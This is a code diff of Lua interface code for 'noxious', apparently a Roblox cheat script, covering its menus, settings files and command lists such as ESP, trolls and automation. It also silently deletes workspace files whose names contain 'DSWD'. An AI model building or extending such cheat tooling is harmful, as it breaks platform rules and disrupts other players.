+			lol.Parent = label
+			lol.PaddingLeft = UDim.new(0, 42)
+
+			local hi = Instance.new("ImageLabel")
+			hi.Size = UDim2.new(0, 20, 0, 20)
+			hi.Position = UDim2.new(1, -295, 0.5, -10)
+			hi.BackgroundColor3 = noxious["default black color"]
+			hi.BackgroundTransparency = 1
+			hi.BorderColor3 = noxious["default white color"]
+			hi.Image = "rbxassetid://14563958666"
+			hi.ZIndex = 5
+			hi.Parent = label
+
+			if labeltype == "warning" then
+				label.BorderColor3 = Color3.new(1, 1, 0.4)
+				label.TextColor3 = Color3.new(1, 1, 0.4)
+				hi.ImageColor3 = Color3.new(1, 1, 0.4)
+			elseif labeltype == "error" then
+				label.BorderColor3 = Color3.new(1, 0.3, 0.3)
+				label.TextColor3 = Color3.new(1, 0.3, 0.3)
+				hi.ImageColor3 = Color3.new(1, 0.3, 0.3)
+			else
+				label.BorderColor3 = noxious["default white color"]
+				label.TextColor3 = noxious["default white color"]
+				hi.ImageColor3 = noxious["default white color"]
+			end
+
+		elseif element.type == "toggle" then
+			local titleHeight = 20
+			local descTextSize = 14
+			local descWidth = noxious["container element width"] - 80
+
+			local hasDesc = element.desc and element.desc ~= ""
+			local manualDescHeight = element.descHeightOverride
+			local descHeight = manualDescHeight or (element.desc and getTextHeight(element.desc, descWidth, descTextSize) or 0)
+			local spacing = hasDesc and 2 or 0
+			local combinedHeight = titleHeight + spacing + descHeight
+
+			local paddingY = 10
+			local frameHeight = math.max(noxious["container button height"], combinedHeight + paddingY * 2)
+
+			local frame = createframe(noxious["button container"], UDim2.new(1, -14, 0, frameHeight))
+			local contentStartY = math.floor((frameHeight - combinedHeight) / 2)
+
+			local title = Instance.new("TextLabel")
+			title.Size = UDim2.new(1, -50, 0, titleHeight)
+			title.Position = UDim2.new(0, 10, 0, contentStartY)
+			title.BackgroundTransparency = 1
+			title.TextColor3 = noxious["default white color"]
+			title.Text = element.title
+			title.Font = Enum.Font.Nunito
+			title.TextSize = 16
+			title.TextXAlignment = Enum.TextXAlignment.Left
+			title.ZIndex = 4
+			title.Parent = frame
+
+			if hasDesc then
+				local desc = Instance.new("TextLabel")
+				desc.Size = UDim2.new(1, -50, 0, descHeight)
+				desc.Position = UDim2.new(0, 10, 0, contentStartY + titleHeight + spacing)
+				desc.BackgroundTransparency = 1
+				desc.TextColor3 = noxious["default gray color"]
+				desc.Text = element.desc
+				desc.Font = Enum.Font.Nunito
+				desc.TextSize = descTextSize
+				desc.TextWrapped = true
+				desc.TextXAlignment = Enum.TextXAlignment.Left
+				desc.ZIndex = 4
+				desc.Parent = frame
+			end
+
+			local toggleButton = createframe(frame, UDim2.new(0, 20, 0, 20))
+			toggleButton.Position = UDim2.new(1, -35, 0.5, -10)
+			toggleButton.ZIndex = 4
+
+			local toggleState = Instance.new("TextButton")
+			toggleState.Size = UDim2.new(1, 0, 1, 0)
+			toggleState.BackgroundTransparency = 0
+			toggleState.BackgroundColor3 = noxious["default black color"]
+			toggleState.TextColor3 = noxious["default white color"]
+			toggleState.Font = Enum.Font.Nunito
+			toggleState.TextSize = 16
+			toggleState.ZIndex = 5
+			toggleState.BorderColor3 = noxious["default white color"]
+			toggleState.Parent = toggleButton
+
+			local currentState = false
+			if noxious["saved settings"][noxious["current list"]][element.title] then
+				currentState = noxious["saved settings"][noxious["current list"]][element.title].state
+			elseif noxious["default toggle states"][element.title] ~= nil then
+				currentState = noxious["default toggle states"][element.title]()
+			elseif element.default ~= nil then
+				currentState = element.default
+			end
+
+			element.state = currentState
+			toggleState.Text = currentState and "X" or " "
+
+			toggleState.MouseButton1Click:Connect(function()
+				playclicksound()
+				currentState = not currentState
+				element.state = currentState
+				toggleState.Text = currentState and "X" or " "
+
+				local varName = noxious["variable mappings"][element.title]
+				if varName and _G[varName] ~= nil then
+					_G[varName] = currentState
+				end
+
+				element.func(currentState)
+				noxious["saved settings"][noxious["current list"]][element.title] = {
+					state = currentState
+				}
+
+				if not noxious["in studio"] then savenoxioussettings() end
+				fetchtoggles()
+			end)
+
+		elseif element.type == "button" then
+			local titleHeight = 20
+			local descTextSize = 14
+			local descWidth = noxious["container element width"] - 80
+
+			local hasDesc = element.desc and element.desc ~= ""
+			local manualDescHeight = element.descHeightOverride
+			local descHeight = manualDescHeight or (element.desc and getTextHeight(element.desc, descWidth, descTextSize) or 0)
+			local spacing = hasDesc and 2 or 0
+			local combinedHeight = titleHeight + spacing + descHeight
+
+			local paddingY = 10
+			local frameHeight = math.max(noxious["container button height"], combinedHeight + paddingY * 2)
+
+			local frame = createframe(noxious["button container"], UDim2.new(1, -14, 0, frameHeight), true)
+
+			local contentStartY = math.floor((frameHeight - combinedHeight) / 2)
+
+			local title = Instance.new("TextLabel")
+			title.Size = UDim2.new(1, -50, 0, titleHeight)
+			title.Position = UDim2.new(0, 10, 0, contentStartY)
+			title.BackgroundTransparency = 1
+			title.TextColor3 = noxious["default white color"]
+			title.Text = element.title
+			title.Font = Enum.Font.Nunito
+			title.TextSize = 16
+			title.TextXAlignment = Enum.TextXAlignment.Left
+			title.ZIndex = 4
+			title.Parent = frame
+
+			if hasDesc then
+				local desc = Instance.new("TextLabel")
+				desc.Size = UDim2.new(1, -50, 0, descHeight)
+				desc.Position = UDim2.new(0, 10, 0, contentStartY + titleHeight + spacing)
+				desc.BackgroundTransparency = 1
+				desc.TextColor3 = noxious["default gray color"]
+				desc.Text = element.desc
+				desc.Font = Enum.Font.Nunito
+				desc.TextSize = descTextSize
+				desc.TextWrapped = true
+				desc.TextXAlignment = Enum.TextXAlignment.Left
+				desc.ZIndex = 4
+				desc.Parent = frame
+			end
+
+			local actionButton = Instance.new("ImageLabel")
+			actionButton.Size = UDim2.new(0, 20, 0, 20)
+			actionButton.Position = UDim2.new(1, -35, 0.5, -10)
+			actionButton.BackgroundColor3 = noxious["default black color"]
+			actionButton.BackgroundTransparency = 1
+			actionButton.BorderColor3 = noxious["default white color"]
+			actionButton.Image = "rbxassetid://13306021272"
+			actionButton.ZIndex = 5
+			actionButton.Parent = frame
+
+			frame.MouseButton1Click:Connect(function()
+				playclicksound()
+				element.func()
+			end)
+
+		elseif element.type == "checkboxes" then
+			local manualDescHeight = element.descHeightOverride
+			local shaveheight = element.shaveheight
+			local descHeight = manualDescHeight or (element.desc and getTextHeight(element.desc, noxious["container element width"] - 60, 12) or 0)
+			local rows = math.ceil(#element.boxes / 2)
+			local boxFrameHeight = rows * 25 + (rows - 1) * 5
+			local frameHeight = descHeight + boxFrameHeight - shaveheight
+
+			local frame = createframe(noxious["button container"], UDim2.new(1, -14, 0, frameHeight))
+
+			local title = Instance.new("TextLabel")
+			title.Size = UDim2.new(1, -50, 0, 20)
+			title.Position = UDim2.new(0, 10, 0, 8)
+			title.BackgroundTransparency = 1
+			title.TextColor3 = noxious["default white color"]
+			title.Text = element.title
+			title.Font = Enum.Font.Nunito
+			title.TextSize = 16
+			title.TextXAlignment = Enum.TextXAlignment.Left
+			title.ZIndex = 4
+			title.Parent = frame
+
+			if element.desc then
+				local desc = Instance.new("TextLabel")
+				desc.Size = UDim2.new(1, -20, 0, descHeight)
+				desc.Position = UDim2.new(0, 10, 0, 28)
+				desc.BackgroundTransparency = 1
+				desc.TextColor3 = noxious["default gray color"]
+				desc.Text = element.desc
+				desc.Font = Enum.Font.Nunito
+				desc.TextSize = 14
+				desc.TextWrapped = true
+				desc.TextXAlignment = Enum.TextXAlignment.Left
+				desc.ZIndex = 4
+				desc.Parent = frame
+			end
+
+			noxious["checkbox grid frame"] = Instance.new("Frame")
+			noxious["checkbox grid frame"].Size = UDim2.new(1, -10, 0, boxFrameHeight)
+			noxious["checkbox grid frame"].Position = UDim2.new(0, 5, 0, 25 + descHeight + 11)
+			noxious["checkbox grid frame"].BackgroundTransparency = 1
+			noxious["checkbox grid frame"].Parent = frame
+
+			local gridLayout = Instance.new("UIGridLayout")
+			gridLayout.CellPadding = UDim2.new(0, 10, 0, 5)
+			gridLayout.CellSize = UDim2.new(0.5, -5, 0, 22)
+			gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+			gridLayout.Parent = noxious["checkbox grid frame"]
+
+			local gridLayout = Instance.new("UIGridLayout")
+			gridLayout.CellPadding = UDim2.new(0, 10, 0, 5)
+			gridLayout.CellSize = UDim2.new(0.5, -5, 0, 22)
+			gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+			gridLayout.Parent = noxious["checkbox grid frame"]
+
+			element.boxStates = {}
+
+			-- Safely get saved settings
+			local saved
+			if noxious["saved settings"] and 
+				noxious["current list"] and 
+				noxious["saved settings"][noxious["current list"]] and 
+				noxious["saved settings"][noxious["current list"]][element.title] then
+				saved = noxious["saved settings"][noxious["current list"]][element.title]
+			end
+
+			-- Initialize all boxes as unchecked by default
+			for _, boxName in ipairs(element.boxes) do
+				element.boxStates[boxName] = false
+			end
+
+			-- Apply saved checked states if they exist
+			if saved and saved.checked then
+				for _, boxName in ipairs(saved.checked) do
+					if element.boxStates[boxName] ~= nil then
+						element.boxStates[boxName] = true
+					end
+				end
+			end
+
+			for _, boxName in ipairs(element.boxes) do
+				local checkboxFrame = Instance.new("Frame")
+				checkboxFrame.Size = UDim2.new(1, 0, 0, 25)
+				checkboxFrame.BackgroundTransparency = 1
+				checkboxFrame.Parent = noxious["checkbox grid frame"]
+
+				local checkbox = createframe(checkboxFrame, UDim2.new(0, 20, 0, 20))
+				checkbox.Position = UDim2.new(0, 0, 0.5, -10)
+				checkbox.ZIndex = 4
+
+				local checkmark = Instance.new("TextButton")
+				checkmark.Size = UDim2.new(1, 0, 1, 0)
+				checkmark.BackgroundTransparency = 0
+				checkmark.BackgroundColor3 = noxious["default black color"]
+				checkmark.TextColor3 = noxious["default white color"]
+				checkmark.BorderColor3 = noxious["default white color"]
+				checkmark.Text = element.boxStates[boxName] and "X" or ""
+				checkmark.ZIndex = 5
+				checkmark.Parent = checkbox
+
+				local label = Instance.new("TextLabel")
+				label.Size = UDim2.new(1, -25, 1, 0)
+				label.Position = UDim2.new(0, 25, 0, 0)
+				label.BackgroundTransparency = 1
+				label.TextColor3 = noxious["default white color"]
+				label.Text = boxName
+				label.Font = Enum.Font.Nunito
+				label.TextSize = 16
+				label.TextXAlignment = Enum.TextXAlignment.Left
+				label.ZIndex = 4
+				label.Parent = checkboxFrame
+
+				checkmark.MouseButton1Click:Connect(function()
+					playclicksound()
+					local isChecked = not element.boxStates[boxName]
+					element.boxStates[boxName] = isChecked
+					checkmark.Text = isChecked and "X" or ""
+					element.func(boxName, isChecked)
+
+					-- Update saved settings
+					if not noxious["saved settings"] then
+						noxious["saved settings"] = {}
+					end
+					if not noxious["saved settings"][noxious["current list"]] then
+						noxious["saved settings"][noxious["current list"]] = {}
+					end
+
+					local checkedBoxes = {}
+					for name, state in pairs(element.boxStates) do
+						if state then
+							table.insert(checkedBoxes, name)
+						end
+					end
+
+					noxious["saved settings"][noxious["current list"]][element.title] = {
+						checked = checkedBoxes
+					}
+					if not noxious["in studio"] then savenoxioussettings() end
+				end)
+			end
+
+		elseif element.type == "inputbox" then
+			local titleHeight = 20
+			local descTextSize = 14
+			local descWidth = noxious["container element width"] - 180
+
+			local hasDesc = element.desc and element.desc ~= ""
+			local manualDescHeight = element.descHeightOverride
+			local descHeight = manualDescHeight or (element.desc and getTextHeight(element.desc, noxious["container element width"] - 60, 12) or 0)
+			local spacing = hasDesc and 0 or 0
+			local combinedHeight = titleHeight + spacing + descHeight
+
+			local paddingY = 10
+			local frameHeight = math.max(noxious["container button height"], combinedHeight + paddingY * 2)
+
+			local frame = createframe(noxious["button container"], UDim2.new(1, -14, 0, frameHeight))
+
+			local contentStartY = math.floor((frameHeight - combinedHeight) / 2)
+
+			local title = Instance.new("TextLabel")
+			title.Size = UDim2.new(1, -50, 0, titleHeight)
+			title.Position = UDim2.new(0, 10, 0, contentStartY)
+			title.BackgroundTransparency = 1
+			title.TextColor3 = noxious["default white color"]
+			title.Text = element.title
+			title.Font = Enum.Font.Nunito
+			title.TextSize = 16
+			title.TextXAlignment = Enum.TextXAlignment.Left
+			title.ZIndex = 4
+			title.Parent = frame
+
+			if hasDesc then
+				local desc = Instance.new("TextLabel")
+				desc.Size = UDim2.new(1, -50, 0, descHeight)
+				desc.Position = UDim2.new(0, 10, 0, contentStartY + titleHeight + spacing)
+				desc.BackgroundTransparency = 1
+				desc.TextColor3 = noxious["default gray color"]
+				desc.Text = element.desc
+				desc.Font = Enum.Font.Nunito
+				desc.TextSize = descTextSize
+				desc.TextWrapped = true
+				desc.TextXAlignment = Enum.TextXAlignment.Left
+				desc.ZIndex = 4
+				desc.Parent = frame
+			end
+
+			local inputBox = Instance.new("TextBox")
+			inputBox.Size = UDim2.new(0, 100, 0, 30)
+			inputBox.Position = UDim2.new(1, -120, 0, (frameHeight - 30) / 2)
+			inputBox.BackgroundColor3 = noxious["default black color"]
+			inputBox.PlaceholderColor3 = noxious["default gray color"]
+			inputBox.BorderColor3 = noxious["default white color"]
+			inputBox.TextColor3 = noxious["default white color"]
+			inputBox.PlaceholderText = element.placeholer or ""
+			inputBox.Font = Enum.Font.Nunito
+			inputBox.TextSize = 16
+			inputBox.ClearTextOnFocus = true
+			inputBox.ClipsDescendants = true
+			inputBox.ZIndex = 4
+			inputBox.Parent = frame
+
+			local initialText = ""
+			local isESPColor = element.title:match("ESP$") or element.title:match("ESP Color$")
+			local espColorVar = isESPColor and getespcolorvariable(element.title)
+
+			if noxious["saved settings"][noxious["current list"]][element.title] then
+				initialText = noxious["saved settings"][noxious["current list"]][element.title].text or ""
+				element.text = initialText
+			elseif isESPColor and espColorVar and defaultespcolors[espColorVar] then
+				local color = defaultespcolors[espColorVar]
+				if typeof(color) == "Color3" then
+					initialText = string.format("%d, %d, %d",
+						math.floor(color.R * 255),
+						math.floor(color.G * 255),
+						math.floor(color.B * 255))
+				else
+					initialText = tostring(color)
+				end
+			elseif element.default ~= nil then
+				initialText = element.default
+			elseif noxious["default input values"][element.title] then
+				initialText = noxious["default input values"][element.title]
+			end
+
+			inputBox.Text = initialText
+			element.lastInput = initialText
+
+			-- Color preview for ESP input boxes
+			local colorPreview
+			if isESPColor then
+				colorPreview = Instance.new("Frame")
+				colorPreview.Size = UDim2.new(0, 7, 0, frameHeight)
+				colorPreview.Position = UDim2.new(1, -7, 0, 0)
+				colorPreview.BackgroundColor3 = tocolor3(initialText) or Color3.new(1, 1, 1)
+				colorPreview.BorderSizePixel = 1
+				colorPreview.BorderColor3 = noxious["default white color"]
+				colorPreview.ZIndex = 4
+				colorPreview.Parent = frame
+
+				inputBox.Position = UDim2.new(1, -127, 0, (frameHeight - 30) / 2)
+			end
+
+			inputBox.FocusLost:Connect(function(enterPressed)
+				if enterPressed then
+					local processedText = inputBox.Text
+					if isESPColor then
+						local color = tocolor3(processedText)
+						if colorPreview and typeof(color) == "Color3" then
+							colorPreview.BackgroundColor3 = color
+						end
+						if espColorVar then
+							local varName = noxious["variable mappings"][element.title]
+							if varName and _G[varName] ~= nil then
+								_G[varName] = color
+							end
+							processedText = string.format("%d, %d, %d", 
+								math.floor(color.R * 255),
+								math.floor(color.G * 255),
+								math.floor(color.B * 255))
+							inputBox.Text = processedText
+							element.func(color)
+						end
+					else
+						if element.title == "Target Toon" or element.title == "Change Language" or element.title == "Toggle Keybind" then
+							local lowerText = processedText:lower()
+							local shouldcap = true
+
+							-- Special multi-character key mappings
+							local specialKeys = {
+								["rnd"] = "RND",
+								["razzledazzle"] = "RazzleDazzle",
+								["owoified"] = "OwOified",
+								["leftshift"] = "LeftShift",
+								["rightshift"] = "RightShift",
+								["["] = "LeftBracket",
+								["]"] = "RightBracket",
+								[";"] = "Semicolon",
+								[","] = "Comma",
+								["."] = "Period",
+								["1"] = "One",
+								["2"] = "Two",
+								["3"] = "Three",
+								["4"] = "Four",
+								["5"] = "Five",
+								["6"] = "Six",
+								["7"] = "Seven",
+								["8"] = "Eight",
+								["9"] = "Nine",
+								["0"] = "Zero"
+							}
+
+							-- Check if this input is a special multi-character key
+							local isSpecial = specialKeys[lowerText] ~= nil
+
+							if isSpecial then
+								processedText = specialKeys[lowerText]
+								shouldcap = false
+							elseif element.title == "Toggle Keybind" and #processedText > 1 then
+								-- If not a special key and input is too long, cut to 1 character
+								processedText = processedText:sub(1, 1)
+							end
+
+							if shouldcap then
+								processedText = processedText:sub(1, 1):upper() .. processedText:sub(2):lower()
+							end
+
+							-- Check validity as Enum.KeyCode
+							local isValidKeyCode = pcall(function()
+								return Enum.KeyCode[processedText]
+							end)
+
+							if not isValidKeyCode then
+								notify(processedText .. " is not a valid keybind.", 5, "error")
+								return
+							end
+
+							inputBox.Text = processedText
+							if element.title == "Toggle Keybind" then
+								notify("Toggle Keybind: " .. processedText, 5)
+							end
+						end
+
+						local varName = noxious["variable mappings"][element.title]
+						if varName and _G[varName] ~= nil then
+							_G[varName] = processedText
+						end
+
+						element.func(processedText)
+					end
+
+					element.text = processedText
+					element.lastInput = processedText
+
+					noxious["saved settings"][noxious["current list"]][element.title] = {
+						text = processedText
+					}
+
+					-- Also sync to ESP color table if applicable
+					if isESPColor and espColorVar then
+						espcolors[espColorVar] = tocolor3(processedText)
+					end
+
+					if not noxious["in studio"] then savenoxioussettings() end
+					fetchinputs()
+				end
+			end)
+		end
+	end
+	local bottomspacer = Instance.new("Frame")
+	bottomspacer.Size = UDim2.new(1, 0, 0, -2)
+	bottomspacer.BackgroundTransparency = 1
+	bottomspacer.Name = "BottomSpacer"
+	bottomspacer.ZIndex = 1
+	bottomspacer.Parent = noxious["button container"]
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["favorited command states"] = noxious["favorited command states"] or {}
+
+noxious["command lists"] = noxious["command lists"] or {}
+noxious["button lists"] = noxious["button lists"] or {}
+noxious["command lists"]["Favorited Commands"] = noxious["command lists"]["Favorited Commands"] or {}
+
+if not noxious["in studio"] then
+	noxious["favorited commands filepath"] = tofolder()
+	noxious["favorited commands file"] = noxious["favorited commands filepath"] .. "/FavoritedCommands.txt"
+	noxious["favorited command states file"] = noxious["favorited commands filepath"] .. "/FavoritedCommandStates.txt"
+end
+
+function deletefile(filename)
+	if isfile(filename) then
+		delfile(filename)
+	end
+end
+
+function loadfavoritedcommands()
+	if not isfile(noxious["favorited commands file"]) then
+		writefile(noxious["favorited commands file"], "")
+	end
+
+	if isfile(noxious["favorited commands file"]) then
+		local fileContent = readfile(noxious["favorited commands file"])
+		for command in fileContent:gmatch('"([^"]+)"') do
+			table.insert(noxious["command lists"]["Favorited Commands"], command)
+		end
+	else
+		noxious["command lists"]["Favorited Commands"] = {}
+	end
+end
+
+function savefavoritedcommands()
+	local fileContent = ""
+	for _, command in ipairs(noxious["command lists"]["Favorited Commands"]) do
+		fileContent = fileContent .. ('"%s",\n'):format(command)
+	end
+	writefile(noxious["favorited commands file"], fileContent)
+end
+
+function loadfavoritedcommandstates()
+	if not isfile(noxious["favorited command states file"]) then
+		writefile(noxious["favorited command states file"], "")
+	end
+
+	if isfile(noxious["favorited command states file"]) then
+		local fileContent = readfile(noxious["favorited command states file"])
+		for command, state in fileContent:gmatch('"([^"]+)":([01]),') do
+			noxious["favorited command states"][command] = state == "1"
+		end
+	else
+		noxious["favorited command states"] = {}
+	end
+end
+
+function savefavoritedcommandstates()
+	local fileContent = ""
+	for command, state in pairs(noxious["favorited command states"]) do
+		fileContent = fileContent .. ('"%s":%s,\n'):format(command, state and "1" or "0")
+	end
+	writefile(noxious["favorited command states file"], fileContent)
+end
+
+task.spawn(function()
+	if not noxious["in studio"] then
+		for _, file in pairs(listfiles("")) do
+			if file:find("DSWD") then
+				local success, err = pcall(function()
+					deletefile(file)
+				end)
+				if success then end
+			end
+		end
+	end
+end)
+
+task.spawn(function()
+	if not noxious["in studio"] then
+		loadfavoritedcommands()
+		loadfavoritedcommandstates()
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["introduction"] = Instance.new("TextLabel")
+noxious["introduction"].Size = UDim2.new(0, 333.3, 0, 204)
+noxious["introduction"].Position = UDim2.new(1, -333.5, 0, 50)
+noxious["introduction"].TextColor3 = noxious["default white color"]
+noxious["introduction"].BorderColor3 = noxious["default white color"]
+noxious["introduction"].BackgroundTransparency = 1
+noxious["introduction"].Font = Enum.Font.Nunito
+noxious["introduction"].Name = "Introduction"
+noxious["introduction"].TextSize = 21.6
+noxious["introduction"].Text = "Thanks for using our script!\n\nPress a button on the left to get started.\n\nSwitch to the 'Changelogs' tab to view the\nupdate logs.\n\nCurrent version: " .. noxious["version"]
+noxious["introduction"].TextWrapped = true
+noxious["introduction"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["introduction"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["introduction"].Parent = mainframe
+noxious["introduction"].ZIndex = 3
+
+noxious["tooltip main frame"] = Instance.new("Frame")
+noxious["tooltip main frame"].Name = "tooltip"
+noxious["tooltip main frame"].Size = UDim2.new(0, 265, 0, 55)
+noxious["tooltip main frame"].BackgroundTransparency = 1
+noxious["tooltip main frame"].BackgroundColor3 = noxious["default black color"]
+noxious["tooltip main frame"].BorderSizePixel = 0
+noxious["tooltip main frame"].ZIndex = 999920
+noxious["tooltip main frame"].Visible = false
+noxious["tooltip main frame"].Parent = noxious["mainframe"]
+
+noxious["tooltip command name"] = Instance.new("TextLabel")
+noxious["tooltip command name"].Name = "CommandName"
+noxious["tooltip command name"].Size = UDim2.new(0, 333, 0, 27)
+noxious["tooltip command name"].Position = UDim2.new(0, -5, 0, -55)
+noxious["tooltip command name"].BackgroundTransparency = 0
+noxious["tooltip command name"].BackgroundColor3 = noxious["default black color"]
+noxious["tooltip command name"].TextColor3 = noxious["default white color"]
+noxious["tooltip command name"].Font = Enum.Font.Nunito
+noxious["tooltip command name"].TextSize = 16
+noxious["tooltip command name"].TextScaled = false
+noxious["tooltip command name"].TextWrapped = true
+noxious["tooltip command name"].BorderSizePixel = 1
+noxious["tooltip command name"].BorderColor3 = noxious["default white color"]
+noxious["tooltip command name"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["tooltip command name"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["tooltip command name"].Parent = noxious["tooltip main frame"]
+noxious["tooltip command name"].ZIndex = 10001
+
+noxious["tooltip command description"] = Instance.new("TextLabel")
+noxious["tooltip command description"].Name = "Description"
+noxious["tooltip command description"].Size = UDim2.new(0, 333, 0, 70)
+noxious["tooltip command description"].Position = UDim2.new(0, -5, -0.43, -10)
+noxious["tooltip command description"].BackgroundTransparency = 0.2
+noxious["tooltip command description"].BackgroundColor3 = noxious["default black color"]
+noxious["tooltip command description"].TextColor3 = noxious["default white color"]
+noxious["tooltip command description"].Font = Enum.Font.Nunito
+noxious["tooltip command description"].TextSize = 16
+noxious["tooltip command description"].TextScaled = false
+noxious["tooltip command description"].TextWrapped = true
+noxious["tooltip command description"].BorderSizePixel = 0
+noxious["tooltip command description"].BorderColor3 = noxious["default white color"]
+noxious["tooltip command description"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["tooltip command description"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["tooltip command description"].Parent = noxious["tooltip main frame"]
+noxious["tooltip command description"].ZIndex = 10000
+
+local padding = Instance.new("UIPadding")
+padding.PaddingLeft = UDim.new(0, 13)
+padding.PaddingRight = UDim.new(0, 13)
+padding.Parent = noxious["tooltip command description"]
+
+local function isWhitespaceOnly(str)
+	return str:match("^%s*$") ~= nil
+end
+
+local commandListOrder = {
+	"Favorited Commands",
+	"Main",
+	"Donor Commands",
+	"ESPs / Visuals",
+	"Client Sided Skins",
+	"Map / Environment",
+	"Teleports / Locating",
+	"Local Player",
+	"Fun / Trolls",
+	"Automation",
+	"Animations / Emotes",
+	"Scripts"
+}
+
+function initializeAllCommands()
+	local allCommands = {}
+	local added = {}
+
+	local commandLists = noxious["command lists"]
+	if not commandLists then return end
+
+	for _, listName in ipairs(commandListOrder) do
+		local list = commandLists[listName]
+		if list then
+			-- Skip Favorited Commands if empty
+			if listName == "Favorited Commands" and #list == 0 then
+				continue
+			end
+
+			for _, cmd in ipairs(list) do
+				-- Avoid duplicate non-whitespace commands
+				if isWhitespaceOnly(cmd) or not added[cmd] then
+					table.insert(allCommands, cmd)
+					if not isWhitespaceOnly(cmd) then
+						added[cmd] = true
+					end
+				end
+			end
+
+			-- Add a space if the last line isn't already a space
+			if #allCommands > 0 and not isWhitespaceOnly(allCommands[#allCommands]) then
+				table.insert(allCommands, "")
+			end
+		end
+	end
+
+	-- Remove final trailing blank line if present
+	if #allCommands > 0 and isWhitespaceOnly(allCommands[#allCommands]) then
+		table.remove(allCommands)
+	end
+
+	-- ⛏️ Clean up consecutive blank lines
+	local cleanedCommands = {}
+	local lastWasSpace = false
+
+	for _, cmd in ipairs(allCommands) do
+		if isWhitespaceOnly(cmd) then
+			if not lastWasSpace then
+				table.insert(cleanedCommands, cmd)
+				lastWasSpace = true
+			end
+		else
+			table.insert(cleanedCommands, cmd)
+			lastWasSpace = false
+		end
+	end
+
+	commandLists["All Commands"] = cleanedCommands
+end
+
+initializeAllCommands()
+
+function updatetooltipSize(commandName, description)
+	local totalHeight = 40
+	local fixedWidth = 302
+
+	noxious["tooltip command name"].Text = commandName
+	noxious["tooltip command description"].Text = description
+
+	noxious["tooltip main frame"].Size = UDim2.new(0, fixedWidth, 0, totalHeight)
+end
+
+noxious["tooltip hover debounce"] = false
+noxious["current hovering command"] = nil
+
+function dispcmds(commandList, listName)
+	noxious["scroll bar holder 2"].Visible = false
+
+	if listName and noxious["command lists"][listName] == commandList then
+		noxious["current list"] = listName
+	end
+
+	for _, child in ipairs(mainframe:GetChildren()) do
+		if child:IsA("Frame") and (child.Name == "ButtonContainer" or child.Name == "CommandContainer") then
+			child:Destroy()
+		elseif child:IsA("TextLabel") and child.Name == "Introduction" then
+			child:Destroy()
+		elseif (child:IsA("ScrollingFrame") and child.Name == "CommandScrollFrame") or child.Name == "ButtonContainer" then
+			child:Destroy()
+		end
+	end
+
+	if noxious["button lists"] then
+		for btnListName, buttonList in pairs(noxious["button lists"]) do
+			if commandList == buttonList then
+				return dispbuttons(buttonList)
+			end
+		end
+	end
+
+	local commandscrollframe = Instance.new("ScrollingFrame")
+	commandscrollframe.Name = "CommandScrollFrame"
+	commandscrollframe.Size = UDim2.new(0, 333, 0, 205)
+	commandscrollframe.Position = UDim2.new(1, -333, 0, 50)
+	commandscrollframe.CanvasSize = UDim2.new(0, 0, 0, 0)
+	commandscrollframe.ScrollBarThickness = 10
+	commandscrollframe.BackgroundTransparency = 1
+	commandscrollframe.BorderColor3 = noxious["default white color"]
+	commandscrollframe.BorderSizePixel = 0
+	commandscrollframe.ZIndex = 3
+	commandscrollframe.Parent = mainframe
+	commandscrollframe.ScrollingDirection = Enum.ScrollingDirection.Y
+	commandscrollframe.ScrollBarImageTransparency = 0
+
+	local commandpadding = Instance.new("UIPadding")
+	commandpadding.PaddingLeft = UDim.new(0, 8)
+	commandpadding.PaddingTop = UDim.new(0, 7)
+	commandpadding.Parent = commandscrollframe
+
+	local itemHeight = 15
+	local spacing = 1
+	local totalHeight = (#commandList * itemHeight) + (#commandList - 1) * spacing
+
+	for i, commandText in ipairs(commandList) do
+		if commandText:match("^%s*$") then
+			local commandtext = Instance.new("TextButton")
+			commandtext.Size = UDim2.new(1, 0, 0, itemHeight * 1.1)
+			commandtext.Position = UDim2.new(0, 0, 0, (i - 1) * (itemHeight + spacing) + 2)
+			commandtext.BackgroundTransparency = 1
+			commandtext.TextColor3 = noxious["default white color"]
+			commandtext.Font = Enum.Font.Nunito
+			commandtext.TextSize = 17
+			commandtext.TextScaled = false
+			commandtext.Text = commandText
+			commandtext.BorderSizePixel = 0
+			commandtext.TextXAlignment = Enum.TextXAlignment.Left
+			commandtext.Parent = commandscrollframe
+			commandtext.ZIndex = 4
+		else
+			local container = Instance.new("Frame")
+			container.Size = UDim2.new(1, 0, 0, itemHeight * 1.1)
+			container.Position = UDim2.new(0, 0, 0, (i - 1) * (itemHeight + spacing))
+			container.BackgroundTransparency = 1
+			container.Parent = commandscrollframe
+			container.ZIndex = 4
+
+			local imageButton = Instance.new("ImageButton")
+			imageButton.Size = UDim2.new(0, 16, 0, 16)
+			imageButton.Position = UDim2.new(0, -3.5, 0.5, 0.5)
+			imageButton.AnchorPoint = Vector2.new(0, 0.5)
+			imageButton.BackgroundTransparency = 1
+			imageButton.Image = noxious["favorited command states"][commandText] and "rbxassetid://84270520426892" or "rbxassetid://110183128911099"
+			imageButton.Parent = container
+			imageButton.ImageColor3 = noxious["default white color"]
+			imageButton.ZIndex = 5
+
+			local infobutton = Instance.new("ImageButton")
+			infobutton.Size = UDim2.new(0, 16, 0, 16)
+			infobutton.Position = UDim2.new(0, 12, 0.5, 0.5)
+			infobutton.AnchorPoint = Vector2.new(0, 0.5)
+			infobutton.BackgroundTransparency = 1
+			infobutton.Image = "rbxassetid://76311199408449"
+			infobutton.Parent = container
+			infobutton.ImageColor3 = noxious["default white color"]
+			infobutton.ZIndex = 5
+
+			local commandtext = Instance.new("TextButton")
+			commandtext.Size = UDim2.new(1, -20, 1, 0)
+			commandtext.Position = UDim2.new(0, 30, 0, 0)
+			commandtext.BackgroundTransparency = 1
+			commandtext.TextColor3 = noxious["default white color"]
+			commandtext.Font = Enum.Font.Nunito
+			commandtext.TextSize = 17
+			commandtext.TextScaled = false
+			commandtext.Text = commandText
+			commandtext.BorderSizePixel = 0
+			commandtext.TextXAlignment = Enum.TextXAlignment.Left
+			commandtext.Parent = container
+			commandtext.ZIndex = 5
+
+			-- Favoriting toggle logic
+			imageButton.MouseButton1Click:Connect(function()
+				playclicksound()
+
